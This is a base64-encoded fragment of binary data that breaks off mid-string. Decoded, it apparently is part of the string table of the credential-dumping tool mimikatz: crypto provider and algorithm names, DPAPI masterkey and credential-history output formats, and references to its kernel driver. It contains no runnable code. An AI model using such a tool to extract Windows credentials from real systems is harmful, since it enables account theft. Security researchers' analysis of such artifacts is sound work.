ADEALgAwAAAAAABNAFMAXwBTAFQAUgBPAE4ARwBfAFAAUgBPAFYAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwB0AHIAbwBuAGcAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAATQBTAF8ARABFAEYAXwBSAFMAQQBfAFMASQBHAF8AUABSAE8AVgAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMAQQAgAFMAaQBnAG4AYQB0AHUAcgBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAATQBTAF8ARABFAEYAXwBSAFMAQQBfAFMAQwBIAEEATgBOAEUATABfAFAAUgBPAFYAAAAAAAAAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUgBTAEEAIABTAEMAaABhAG4AbgBlAGwAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAEQARQBGAF8ARABTAFMAXwBQAFIATwBWAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAEQARQBGAF8ARABTAFMAXwBEAEgAXwBQAFIATwBWAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEIAYQBzAGUAIABEAFMAUwAgAGEAbgBkACAARABpAGYAZgBpAGUALQBIAGUAbABsAG0AYQBuACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAAAAAAAE0AUwBfAEUATgBIAF8ARABTAFMAXwBEAEgAXwBQAFIATwBWAAAAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAARABTAFMAIABhAG4AZAAgAEQAaQBmAGYAaQBlAC0ASABlAGwAbABtAGEAbgAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAAAABNAFMAXwBEAEUARgBfAEQASABfAFMAQwBIAEEATgBOAEUATABfAFAAUgBPAFYAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARABIACAAUwBDAGgAYQBuAG4AZQBsACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAAAAAAAE0AUwBfAFMAQwBBAFIARABfAFAAUgBPAFYAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAUwBtAGEAcgB0ACAAQwBhAHIAZAAgAEMAcgB5AHAAdABvACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAEUATgBIAF8AUgBTAEEAXwBBAEUAUwBfAFAAUgBPAFYAXwBYAFAAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByACAAKABQAHIAbwB0AG8AdAB5AHAAZQApAAAAAAAAAE0AUwBfAEUATgBIAF8AUgBTAEEAXwBBAEUAUwBfAFAAUgBPAFYAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAFIAUwBBACAAYQBuAGQAIABBAEUAUwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAAUABSAE8AVgBfAFIAUwBBAF8ARgBVAEwATAAAAAAAAABQAFIATwBWAF8AUgBTAEEAXwBTAEkARwAAAAAAAAAAAFAAUgBPAFYAXwBEAFMAUwAAAAAAAAAAAFAAUgBPAFYAXwBGAE8AUgBUAEUAWgBaAEEAAAAAAAAAUABSAE8AVgBfAE0AUwBfAEUAWABDAEgAQQBOAEcARQAAAAAAAAAAAFAAUgBPAFYAXwBTAFMATAAAAAAAAAAAAFAAUgBPAFYAXwBSAFMAQQBfAFMAQwBIAEEATgBOAEUATAAAAAAAAABQAFIATwBWAF8ARABTAFMAXwBEAEgAAABQAFIATwBWAF8ARQBDAF8ARQBDAEQAUwBBAF8AUwBJAEcAAAAAAAAAUABSAE8AVgBfAEUAQwBfAEUAQwBOAFIAQQBfAFMASQBHAAAAAAAAAFAAUgBPAFYAXwBFAEMAXwBFAEMARABTAEEAXwBGAFUATABMAAAAAABQAFIATwBWAF8ARQBDAF8ARQBDAE4AUgBBAF8ARgBVAEwATAAAAAAAUABSAE8AVgBfAEQASABfAFMAQwBIAEEATgBOAEUATAAAAAAAAAAAAFAAUgBPAFYAXwBTAFAAWQBSAFUAUwBfAEwAWQBOAEsAUwAAAAAAAABQAFIATwBWAF8AUgBOAEcAAAAAAAAAAABQAFIATwBWAF8ASQBOAFQARQBMAF8AUwBFAEMAAAAAAFAAUgBPAFYAXwBSAEUAUABMAEEAQwBFAF8ATwBXAEYAAAAAAAAAAABQAFIATwBWAF8AUgBTAEEAXwBBAEUAUwAAAAAAAAAAAEMAQQBMAEcAXwBNAEQAMgAAAAAAAAAAAEMAQQBMAEcAXwBNAEQANAAAAAAAAAAAAEMAQQBMAEcAXwBNAEQANQAAAAAAAAAAAEMAQQBMAEcAXwBTAEgAQQAxAAAAAAAAAEMAQQBMAEcAXwBNAEEAQwAAAAAAAAAAAEMAQQBMAEcAXwBSAFMAQQBfAFMASQBHAE4AAAAAAAAAQwBBAEwARwBfAEQAUwBTAF8AUwBJAEcATgAAAAAAAABDAEEATABHAF8ATgBPAF8AUwBJAEcATgAAAAAAAAAAAEMAQQBMAEcAXwBSAFMAQQBfAEsARQBZAFgAAAAAAAAAQwBBAEwARwBfAEQARQBTAAAAAAAAAAAAQwBBAEwARwBfADMARABFAFMAXwAxADEAMgAAAAAAAABDAEEATABHAF8AMwBEAEUAUwAAAAAAAABDAEEATABHAF8ARABFAFMAWAAAAAAAAABDAEEATABHAF8AUgBDADIAAAAAAAAAAABDAEEATABHAF8AUgBDADQAAAAAAAAAAABDAEEATABHAF8AUwBFAEEATAAAAAAAAABDAEEATABHAF8ARABIAF8AUwBGAAAAAABDAEEATABHAF8ARABIAF8ARQBQAEgARQBNAAAAAAAAAEMAQQBMAEcAXwBBAEcAUgBFAEUARABLAEUAWQBfAEEATgBZAAAAAABDAEEATABHAF8ASwBFAEEAXwBLAEUAWQBYAAAAAAAAAEMAQQBMAEcAXwBIAFUARwBIAEUAUwBfAE0ARAA1AAAAQwBBAEwARwBfAFMASwBJAFAASgBBAEMASwAAAAAAAABDAEEATABHAF8AVABFAEsAAAAAAAAAAABDAEEATABHAF8AQwBZAEwASQBOAEsAXwBNAEUASwAAAEMAQQBMAEcAXwBTAFMATAAzAF8AUwBIAEEATQBEADUAAAAAAAAAAABDAEEATABHAF8AUwBTAEwAMwBfAE0AQQBTAFQARQBSAAAAAAAAAAAAQwBBAEwARwBfAFMAQwBIAEEATgBOAEUATABfAE0AQQBTAFQARQBSAF8ASABBAFMASAAAAAAAAABDAEEATABHAF8AUwBDAEgAQQBOAE4ARQBMAF8ATQBBAEMAXwBLAEUAWQAAAAAAAABDAEEATABHAF8AUwBDAEgAQQBOAE4ARQBMAF8ARQBOAEMAXwBLAEUAWQAAAAAAAABDAEEATABHAF8AUABDAFQAMQBfAE0AQQBTAFQARQBSAAAAAAAAAAAAQwBBAEwARwBfAFMAUwBMADIAXwBNAEEAUwBUAEUAUgAAAAAAAAAAAEMAQQBMAEcAXwBUAEwAUwAxAF8ATQBBAFMAVABFAFIAAAAAAAAAAABDAEEATABHAF8AUgBDADUAAAAAAAAAAABDAEEATABHAF8ASABNAEEAQwAAAAAAAABDAEEATABHAF8AVABMAFMAMQBQAFIARgAAAAAAAAAAAEMAQQBMAEcAXwBIAEEAUwBIAF8AUgBFAFAATABBAEMARQBfAE8AVwBGAAAAAAAAAEMAQQBMAEcAXwBBAEUAUwBfADEAMgA4AAAAAAAAAAAAQwBBAEwARwBfAEEARQBTAF8AMQA5ADIAAAAAAAAAAABDAEEATABHAF8AQQBFAFMAXwAyADUANgAAAAAAAAAAAEMAQQBMAEcAXwBBAEUAUwAAAAAAAAAAAEMAQQBMAEcAXwBTAEgAQQBfADIANQA2AAAAAAAAAAAAQwBBAEwARwBfAFMASABBAF8AMwA4ADQAAAAAAAAAAABDAEEATABHAF8AUwBIAEEAXwA1ADEAMgAAAAAAAAAAAEMAQQBMAEcAXwBFAEMARABIAAAAAAAAAEMAQQBMAEcAXwBFAEMATQBRAFYAAAAAAEMAQQBMAEcAXwBFAEMARABTAEEAAAAAAEEAVABfAEsARQBZAEUAWABDAEgAQQBOAEcARQAA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ACAAIAAgACAAIAAgACAAOgAgAHsAJQAuADMANgBzAH0ACgAAAAAAAAAAAAAAAAAlACoAcwAgACAAZAB3AE0AYQBzAHQAZQByAEsAZQB5AEwAZQBuACAAIAAgACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAAAAAAAAAACUAKgBzACAAIABkAHcAQgBhAGMAawB1AHAASwBlAHkATABlAG4AIAAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAAAAAJQAqAHMAIAAgAGQAdwBDAHIAZQBkAEgAaQBzAHQATABlAG4AIAAgACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAAAAlACoAcwAgACAAZAB3AEQAbwBtAGEAaQBuAEsAZQB5AEwAZQBuACAAIAAgACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAAAAAAAAAACUAKgBzAFsAbQBhAHMAdABlAHIAawBlAHkAXQAKAAAAJQAqAHMAWwBiAGEAYwBrAHUAcABrAGUAeQBdAAoAAAAlACoAcwBbAGMAcgBlAGQAaABpAHMAdABdAAoAAAAAACUAKgBzAFsAZABvAG0AYQBpAG4AawBlAHkAXQAKAAAAJQAqAHMAKgAqAEMAUgBFAEQASABJAFMAVAAqACoACgAAAAAAAAAAACUAKgBzACAAIABkAHcAVgBlAHIAcwBpAG8AbgAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAJQAqAHMAIAAgAGcAdQBpAGQAIAAgACAAIAAgACAAOgAgAAAAAAAAACUAKgBzACAAIABkAHcATgBlAHgAdABMAGUAbgAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAJQAqAHMAKgAqAEMAUgBFAEQASABJAFMAVAAgAEUATgBUAFIAWQAqACoACgAAAAAAJQAqAHMAIAAgAGQAdwBUAHkAcABlACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAAAAAACUAKgBzACAAIABhAGwAZwBIAGEAcwBoACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAgACgAJQBzACkACgAAAAAAAAAAACUAKgBzACAAIAByAG8AdQBuAGQAcwAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAJQAqAHMAIAAgAHMAaQBkAEwAZQBuACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAAAAAACUAKgBzACAAIABhAGwAZwBDAHIAeQBwAHQAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAgACgAJQBzACkACgAAAAAAAAAAACUAKgBzACAAIABzAGgAYQAxAEwAZQBuACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAJQAqAHMAIAAgAG0AZAA0AEwAZQBuACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAlACoAcwAgACAAUwBhAGwAdAAgACAAIAAgACAAIAA6ACAAAAAAAAAAJQAqAHMAIAAgAFMAaQBkACAAIAAgACAAIAAgACAAOgAgAAAAAAAAACUAKgBzACAAIABwAFMAZQBjAHIAZQB0ACAAIAAgADoAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAGQAcABhAHAAaQBfAHUAbgBwAHIAbwB0AGUAYwB0AF8AYgBsAG8AYgAgADsAIABDAHIAeQBwAHQARABlAGMAcgB5AHAAdAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AZABwAGEAcABpAF8AdQBuAHAAcgBvAHQAZQBjAHQAXwBiAGwAbwBiACAAOwAgAGsAdQBsAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBjAGwAbwBzAGUAXwBoAHAAcgBvAHYAXwBkAGUAbABlAHQAZQBfAGMAbwBuAHQAYQBpAG4AZQByACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AZABwAGEAcABpAF8AdQBuAHAAcgBvAHQAZQBjAHQAXwBiAGwAbwBiACAAOwAgAGsAdQBsAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBoAGsAZQB5AF8AcwBlAHMAcwBpAG8AbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAGQAcABhAHAAaQBfAHUAbgBwAHIAbwB0AGUAYwB0AF8AbQBhAHMAdABlAHIAawBlAHkAXwB3AGkAdABoAF8AcwBoAGEARABlAHIAaQB2AGUAZABrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAGMAcgB5AHAAdABvAF8AYwBsAG8AcwBlAF8AaABwAHIAbwB2AF8AZABlAGwAZQB0AGUAXwBjAG8AbgB0AGEAaQBuAGUAcgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAGQAcABhAHAAaQBfAHUAbgBwAHIAbwB0AGUAYwB0AF8AbQBhAHMAdABlAHIAawBlAHkAXwB3AGkAdABoAF8AcwBoAGEARABlAHIAaQB2AGUAZABrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAGMAcgB5AHAAdABvAF8AaABrAGUAeQBfAHMAZQBzAHMAaQBvAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBkAHAAYQBwAGkAXwB1AG4AcAByAG8AdABlAGMAdABfAGQAbwBtAGEAaQBuAGsAZQB5AF8AdwBpAHQAaABfAGsAZQB5ACAAOwAgAEMAcgB5AHAAdABEAGUAYwByAHkAcAB0ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AZABwAGEAcABpAF8AdQBuAHAAcgBvAHQAZQBjAHQAXwBkAG8AbQBhAGkAbgBrAGUAeQBfAHcAaQB0AGgAXwBrAGUAeQAgADsAIABDAHIAeQBwAHQAUwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAGQAcABhAHAAaQBfAHUAbgBwAHIAbwB0AGUAYwB0AF8AZABvAG0AYQBpAG4AawBlAHkAXwB3AGkAdABoAF8AawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGMAbABvAHMAZQBfAGgAcAByAG8AdgBfAGQAZQBsAGUAdABlAF8AYwBvAG4AdABhAGkAbgBlAHIAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBkAHAAYQBwAGkAXwB1AG4AcAByAG8AdABlAGMAdABfAGMAcgBlAGQAaABpAHMAdABfAGUAbgB0AHIAeQBfAHcAaQB0AGgAXwBzAGgAYQBEAGUAcgBpAHYAZQBkAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBjAGwAbwBzAGUAXwBoAHAAcgBvAHYAXwBkAGUAbABlAHQAZQBfAGMAbwBuAHQAYQBpAG4AZQByACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBkAHAAYQBwAGkAXwB1AG4AcAByAG8AdABlAGMAdABfAGMAcgBlAGQAaABpAHMAdABfAGUAbgB0AHIAeQBfAHcAaQB0AGgAXwBzAGgAYQBEAGUAcgBpAHYAZQBkAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBoAGsAZQB5AF8AcwBlAHMAcwBpAG8AbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAG8AbgBfAHUAbgBwAHIAbwB0AGUAYwB0AAAAAAAAAAAAbwBuAF8AcAByAG8AdABlAGMAdAAAAAAAcgBlAHMAZQByAHYAZQBkAAAAAAAAAAAAcwB0AHIAbwBuAGcAAAAAAHIAZQBxAHUAaQByAGUAXwBzAHQAcgBvAG4AZwAAAAAAJQBzACAAOwAgAAAAAAAAAHUAaQBfAGYAbwByAGIAaQBkAGQAZQBuAAAAAAAAAAAAdQBuAGsAbgBvAHcAbgAAAGwAbwBjAGEAbABfAG0AYQBjAGgAaQBuAGUAAAAAAAAAYwByAGUAZABfAHMAeQBuAGMAAAAAAAAAYQB1AGQAaQB0AAAAAAAAAG4AbwBfAHIAZQBjAG8AdgBlAHIAeQAAAHYAZQByAGkAZgB5AF8AcAByAG8AdABlAGMAdABpAG8AbgAAAAAAAABjAHIAZQBkAF8AcgBlAGcAZQBuAGUAcgBhAHQAZQAAAHN5c3RlbQAACgA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0ACgBCAGEAcwBlADYANAAgAG8AZgAgAGYAaQBsAGUAIAA6ACAAJQBzAAoAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AAoAAAAlAGMAAAAAAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBrAGUAcgBuAGUAbABfAGkAbwBjAHQAbABfAGgAYQBuAGQAbABlACAAOwAgAEQAZQB2AGkAYwBlAEkAbwBDAG8AbgB0AHIAbwBsACAAKAAwAHgAJQAwADgAeAApACAAOgAgADAAeAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBrAGUAcgBuAGUAbABfAGkAbwBjAHQAbAAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABcAFwALgBcAG0AaQBtAGkAZAByAHYAAAAlACoAcwAqACoASwBFAFkAIAAoAGMAYQBwAGkAKQAqACoACgAAAAAAAAAAAAAAAAAlACoAcwAgACAAZAB3AFUAbgBpAHEAdQBlAE4AYQBtAGUATABlAG4AIAAgACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAAAAAAAAAACUAKgBzACAAIABkAHcAUAB1AGIAbABpAGMASwBlAHkATABlAG4AIAAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAAAAAJQAqAHMAIAAgAGQAdwBQAHIAaQB2AGEAdABlAEsAZQB5AEwAZQBuACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAAAAlACoAcwAgACAAZAB3AEgAYQBzAGgATABlAG4AIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAAAAAAAAAACUAKgBzACAAIABkAHcARQB4AHAAbwByAHQARgBsAGEAZwBMAGUAbgAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAAAAAJQAqAHMAIAAgAHAAVQBuAGkAcQB1AGUATgBhAG0AZQAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAlAFMACgAAACUAKgBzACAAIABwAEgAYQBzAGgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAJQAqAHMAIAAgAHAAUAB1AGIAbABpAGMASwBlAHkAIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAlACoAcwAgACAAcABQAHIAaQB2AGEAdABlAEsAZQB5ACAAIAAgACAAIAAgACAAIAA6AAoAAAAAACUAKgBzACAAIABwAEUAeABwAG8AcgB0AEYAbABhAGcAIAAgACAAIAAgACAAIAAgADoACgAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBrAGUAeQBfAGMAbgBnAF8AYwByAGUAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwBrAGUAeQBfAGMAbgBnAF8AcAByAG8AcABlAHIAdABpAGUAcwBfAGMAcgBlAGEAdABlACAAKABwAHUAYgBsAGkAYwApAAoAAAAAAAAAAAAlACoAcwAqACoASwBFAFkAIAAoAGMAbgBnACkAKgAqAAoAAAAAAAAAJQAqAHMAIAAgAGQAdwBWAGUAcgBzAGkAbwBuACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAlACoAcwAgACAAdQBuAGsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAACUAKgBzACAAIABkAHcATgBhAG0AZQBMAGUAbgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAJQAqAHMAIAAgAHQAeQBwAGUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAlACoAcwAgACAAZAB3AFAAdQBiAGwAaQBjAFAAcgBvAHAAZQByAHQAaQBlAHMATABlAG4AIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAACUAKgBzACAAIABkAHcAUAByAGkAdgBhAHQAZQBQAHIAbwBwAGUAcgB0AGkAZQBzAEwAZQBuADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAJQAqAHMAIAAgAGQAdwBQAHIAaQB2AGEAdABlAEsAZQB5AEwAZQBuACAAIAAgACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAlACoAcwAgACAAdQBuAGsAQQByAHIAYQB5AFsAMQA2AF0AIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAAAJQAqAHMAIAAgAHAATgBhAG0AZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAAACUALgAqAHMACgAAAAAAAAAlACoAcwAgACAAcABQAHUAYgBsAGkAYwBQAHIAbwBwAGUAcgB0AGkAZQBzACAAIAAgACAAIAA6ACAAAAAAAAAAJQAqAHMAIAAgAHAAUAByAGkAdgBhAHQ